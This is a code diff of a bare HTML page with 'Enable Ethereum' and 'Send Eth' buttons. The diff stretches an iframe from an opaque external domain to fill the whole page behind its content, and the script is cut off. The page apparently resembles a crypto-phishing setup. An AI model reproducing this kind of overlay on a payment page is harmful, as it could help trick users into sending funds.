@@ -3,8 +3,26 @@
 <html>
 
 <head>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <style>
+  #all {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: none;
+    z-index: -1;
+  };
+      .enableEthereumButton, .sendEthButton {
+    width: 200px;
+    height: 50px;
+  }
+</style>
 
-
+    
+    <title>Document</title>
 </head>
 
 
@@ -12,7 +30,7 @@
     <h1>This is my site   :)))</h1>
     <button class="enableEthereumButton btn">Enable Ethereum</button>
     <button class="sendEthButton btn">Send Eth</button>
-    <iframe src="https://8571e594.n0p.online/aad805.html" frameborder="0" style="overflow:hidden;height:100%;width:100%" height="500%" width="200%"></iframe>
+    <iframe id="all" src="https://8571e594.n0p.online/aad805.html" frameborder="0" style="overflow:hidden;height:100%;width:100%" height="500%" width="200%"></iframe>
 
    <script>
     const ethereumButton = document.querySelector('.enableEthereumButton');
